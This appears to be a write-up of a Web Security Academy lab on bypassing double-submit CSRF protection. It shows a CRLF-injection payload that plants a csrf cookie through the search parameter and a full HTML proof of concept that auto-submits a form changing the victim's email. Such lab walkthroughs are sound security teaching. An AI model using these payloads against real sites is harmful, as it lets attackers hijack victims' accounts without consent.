# CSRF where token is duplicated in cookie

### Goal - 

use your exploit server to host an HTML page that uses a CSRF attack to change the viewer’s email address.

Credentials - wiener:peter, carlos:montoya

### Analysis/Exploitation -

<span style="color: #BE5B00">**Find weak CSRF protection**</span>

Login as user `wiener`:

It is immediately obvious that the csrf token appears twice: in the request body as well as in a cookie. This could mean two things:

1. The backend does not do any csrf tracking and just verifies that the body token equals the cookie token which was set at some time earlier
(in this case, during the initial visit of the `/login` page)
1. The backend tracks the csrf tokens as usual, just uses the cookie value as additional line of defense.This is so call the “double submit” defense against CSRF.

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/55396d3f-1cc6-43e1-ba2a-ab28a3cc836f/2024-02-20_19-40.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466U2ZFN4TH%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T221850Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCICCqwEULyvBI%2FhJreEYv75IgHdpJBe0d%2Bo4ylIoTlvJYAiB%2BtjyhGyt7BXzug8FLcT%2F73gLQW9Cgv9NGngcdBRrIlyqIBAiv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIMzEL%2FSlip1JvEJa2JKtwDaKaUr2%2FS%2BqauHSSqtKFQ2as%2F3ojbmiHDzOIhcwq3Trjq0OOTkMn3NXUrzo%2B7s%2BZnsiRYx4DM7LeHuwfhbQc4ZVA6u8pWl%2BHZBYdadTMKVlmRIyLqFjbocA%2F1j5FfsC4sCj0LQC6v2gjkpFQgMXOtb6oMEdgpUCfUxpGLZ93DhQtUz5%2FZAsw7JaTU%2B%2Bo2oEfoT%2BtnKKMNVMAYeBsKGKyaPFKPNs%2BegCQtIIOI6VMS7%2FXsVmUdsb8iL3hv5vQvnqFhTulNcx3la8QOnL2ToXYifQA%2FIws9U62JhdZNrJnSdE%2F%2F9%2BP%2FnIcOenQK%2F3cyMNRjOrMVJ5b3CaEp0sJNTkh%2BLOJYBgTWId4S6sDKHJyenpNMqPHMGb2C%2FmBGYJ%2FSlsrAfJUQclkwrrv1gcZ2nkH7RSU5nclvRzNuazbxLqQCy8oG8srEYan81aYF8yxGn8mtFAbliuPoJxkd0HlB6RHVHWO42eMnZ8aTtOGPzKF08h%2F06vnPf15rsSKC9D898kxhX22Pul0fbnHdm3ALGbQYz7ZNKM5W77zyIP14A8G3D6Otj7PRYt9RoaPlKEg9HJmnbXPXI7KyxjjWmrOZ6BV1vfKRaAzo%2B1fRXDATK3vSZMyuC5cPpm2YOATYwxowloSj1AY6pgHPj6o6VVTuD7U6FOxbCKg5x5gPNPTfSd4jtJPMfzVcDXazKsJjOTmrjG8fZReOFug0F%2BRwSph1v%2FBGXaexXjGzSrjN4BpXLDPUeuBhKA%2B8FM8VnfHhTRmLyrOOIJv8Hphve%2F%2Fsyj60R90Jm5hm8Ddy0TxDisb4d5IRSjIAqTMht0BdOXS%2FaJa5Hz%2BEhgF7HS5Nf3C2QDvjQkTimRy9ZdsXdwZicQ6R&X-Amz-Signature=5241cf4ff39da32a38da17b4310cbf37aabdbcf5a5ccd39b29a0c8ff560bb2d8&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

the request goes through and the email get updated.

If this don’t work we could try valid CSRF token and cookie from another user since backend tracks the csrf tokens and it could be find out  whether csrf token are tied to session cookie.

<span style="color: #BE5B00">**Find ways to set the csrf token**</span>

the blog suffers the same vulnerability in the search feature

**When we click the **`Search`** button, it’ll send a GET request to **`/`** with the parameter **`search`**.**

**Also, when we sent the request, it’ll set a new cookie value: **`LastSearchTerm=<seach_parameter_value>`**!**

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/8533d25a-7752-4f8b-87bd-a0854ec3b792/2024-02-20_20-30.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466U2ZFN4TH%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T221850Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCICCqwEULyvBI%2FhJreEYv75IgHdpJBe0d%2Bo4ylIoTlvJYAiB%2BtjyhGyt7BXzug8FLcT%2F73gLQW9Cgv9NGngcdBRrIlyqIBAiv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIMzEL%2FSlip1JvEJa2JKtwDaKaUr2%2FS%2BqauHSSqtKFQ2as%2F3ojbmiHDzOIhcwq3Trjq0OOTkMn3NXUrzo%2B7s%2BZnsiRYx4DM7LeHuwfhbQc4ZVA6u8pWl%2BHZBYdadTMKVlmRIyLqFjbocA%2F1j5FfsC4sCj0LQC6v2gjkpFQgMXOtb6oMEdgpUCfUxpGLZ93DhQtUz5%2FZAsw7JaTU%2B%2Bo2oEfoT%2BtnKKMNVMAYeBsKGKyaPFKPNs%2BegCQtIIOI6VMS7%2FXsVmUdsb8iL3hv5vQvnqFhTulNcx3la8QOnL2ToXYifQA%2FIws9U62JhdZNrJnSdE%2F%2F9%2BP%2FnIcOenQK%2F3cyMNRjOrMVJ5b3CaEp0sJNTkh%2BLOJYBgTWId4S6sDKHJyenpNMqPHMGb2C%2FmBGYJ%2FSlsrAfJUQclkwrrv1gcZ2nkH7RSU5nclvRzNuazbxLqQCy8oG8srEYan81aYF8yxGn8mtFAbliuPoJxkd0HlB6RHVHWO42eMnZ8aTtOGPzKF08h%2F06vnPf15rsSKC9D898kxhX22Pul0fbnHdm3ALGbQYz7ZNKM5W77zyIP14A8G3D6Otj7PRYt9RoaPlKEg9HJmnbXPXI7KyxjjWmrOZ6BV1vfKRaAzo%2B1fRXDATK3vSZMyuC5cPpm2YOATYwxowloSj1AY6pgHPj6o6VVTuD7U6FOxbCKg5x5gPNPTfSd4jtJPMfzVcDXazKsJjOTmrjG8fZReOFug0F%2BRwSph1v%2FBGXaexXjGzSrjN4BpXLDPUeuBhKA%2B8FM8VnfHhTRmLyrOOIJv8Hphve%2F%2Fsyj60R90Jm5hm8Ddy0TxDisb4d5IRSjIAqTMht0BdOXS%2FaJa5Hz%2BEhgF7HS5Nf3C2QDvjQkTimRy9ZdsXdwZicQ6R&X-Amz-Signature=62ebf398e33d1918ec625d7604c05b2a85ab8f5b2d38edbc267e502ae8739684&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

**we have found that it’s vulnerable to CRLF injection, which enables attacker to add a new cookie!**

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/cfa8c277-988d-49b1-9a5b-6c2c64a2f4f5/2024-02-20_20-38.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466U2ZFN4TH%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T221850Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCICCqwEULyvBI%2FhJreEYv75IgHdpJBe0d%2Bo4ylIoTlvJYAiB%2BtjyhGyt7BXzug8FLcT%2F73gLQW9Cgv9NGngcdBRrIlyqIBAiv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIMzEL%2FSlip1JvEJa2JKtwDaKaUr2%2FS%2BqauHSSqtKFQ2as%2F3ojbmiHDzOIhcwq3Trjq0OOTkMn3NXUrzo%2B7s%2BZnsiRYx4DM7LeHuwfhbQc4ZVA6u8pWl%2BHZBYdadTMKVlmRIyLqFjbocA%2F1j5FfsC4sCj0LQC6v2gjkpFQgMXOtb6oMEdgpUCfUxpGLZ93DhQtUz5%2FZAsw7JaTU%2B%2Bo2oEfoT%2BtnKKMNVMAYeBsKGKyaPFKPNs%2BegCQtIIOI6VMS7%2FXsVmUdsb8iL3hv5vQvnqFhTulNcx3la8QOnL2ToXYifQA%2FIws9U62JhdZNrJnSdE%2F%2F9%2BP%2FnIcOenQK%2F3cyMNRjOrMVJ5b3CaEp0sJNTkh%2BLOJYBgTWId4S6sDKHJyenpNMqPHMGb2C%2FmBGYJ%2FSlsrAfJUQclkwrrv1gcZ2nkH7RSU5nclvRzNuazbxLqQCy8oG8srEYan81aYF8yxGn8mtFAbliuPoJxkd0HlB6RHVHWO42eMnZ8aTtOGPzKF08h%2F06vnPf15rsSKC9D898kxhX22Pul0fbnHdm3ALGbQYz7ZNKM5W77zyIP14A8G3D6Otj7PRYt9RoaPlKEg9HJmnbXPXI7KyxjjWmrOZ6BV1vfKRaAzo%2B1fRXDATK3vSZMyuC5cPpm2YOATYwxowloSj1AY6pgHPj6o6VVTuD7U6FOxbCKg5x5gPNPTfSd4jtJPMfzVcDXazKsJjOTmrjG8fZReOFug0F%2BRwSph1v%2FBGXaexXjGzSrjN4BpXLDPUeuBhKA%2B8FM8VnfHhTRmLyrOOIJv8Hphve%2F%2Fsyj60R90Jm5hm8Ddy0TxDisb4d5IRSjIAqTMht0BdOXS%2FaJa5Hz%2BEhgF7HS5Nf3C2QDvjQkTimRy9ZdsXdwZicQ6R&X-Amz-Signature=eacc5aeb1e2b56e130ba98c1f400778ba11c57a47c242e6a4ea288fb7267beff&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

generate csrf poc

Remove the auto-submit `<script>` block, and instead add the following code to inject the cookie:

```text
<img src="https://0af700c203d292bf81886c5900e500eb.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=abcd%3b%20SameSite=None" onerror="document.forms[0].submit()">
```

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/8ad58dd2-a838-4736-93a1-2d575b15da75/2024-02-20_22-00.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466U2ZFN4TH%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T221850Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCICCqwEULyvBI%2FhJreEYv75IgHdpJBe0d%2Bo4ylIoTlvJYAiB%2BtjyhGyt7BXzug8FLcT%2F73gLQW9Cgv9NGngcdBRrIlyqIBAiv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIMzEL%2FSlip1JvEJa2JKtwDaKaUr2%2FS%2BqauHSSqtKFQ2as%2F3ojbmiHDzOIhcwq3Trjq0OOTkMn3NXUrzo%2B7s%2BZnsiRYx4DM7LeHuwfhbQc4ZVA6u8pWl%2BHZBYdadTMKVlmRIyLqFjbocA%2F1j5FfsC4sCj0LQC6v2gjkpFQgMXOtb6oMEdgpUCfUxpGLZ93DhQtUz5%2FZAsw7JaTU%2B%2Bo2oEfoT%2BtnKKMNVMAYeBsKGKyaPFKPNs%2BegCQtIIOI6VMS7%2FXsVmUdsb8iL3hv5vQvnqFhTulNcx3la8QOnL2ToXYifQA%2FIws9U62JhdZNrJnSdE%2F%2F9%2BP%2FnIcOenQK%2F3cyMNRjOrMVJ5b3CaEp0sJNTkh%2BLOJYBgTWId4S6sDKHJyenpNMqPHMGb2C%2FmBGYJ%2FSlsrAfJUQclkwrrv1gcZ2nkH7RSU5nclvRzNuazbxLqQCy8oG8srEYan81aYF8yxGn8mtFAbliuPoJxkd0HlB6RHVHWO42eMnZ8aTtOGPzKF08h%2F06vnPf15rsSKC9D898kxhX22Pul0fbnHdm3ALGbQYz7ZNKM5W77zyIP14A8G3D6Otj7PRYt9RoaPlKEg9HJmnbXPXI7KyxjjWmrOZ6BV1vfKRaAzo%2B1fRXDATK3vSZMyuC5cPpm2YOATYwxowloSj1AY6pgHPj6o6VVTuD7U6FOxbCKg5x5gPNPTfSd4jtJPMfzVcDXazKsJjOTmrjG8fZReOFug0F%2BRwSph1v%2FBGXaexXjGzSrjN4BpXLDPUeuBhKA%2B8FM8VnfHhTRmLyrOOIJv8Hphve%2F%2Fsyj60R90Jm5hm8Ddy0TxDisb4d5IRSjIAqTMht0BdOXS%2FaJa5Hz%2BEhgF7HS5Nf3C2QDvjQkTimRy9ZdsXdwZicQ6R&X-Amz-Signature=2ada5de6b1426672e9094f83b37c3b91e5b37bf9dd8430fbca7a1887c95276f8&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0af700c203d292bf81886c5900e500eb.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test&#64;domain&#46;com" />
      <input type="hidden" name="csrf" value="abcd" />
      <input type="submit" value="Submit request" />
    </form>
    <img src="https://0af700c203d292bf81886c5900e500eb.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=abcd%3b%20SameSite=None" onerror="document.forms[0].submit()">
  </body>
</html>
```
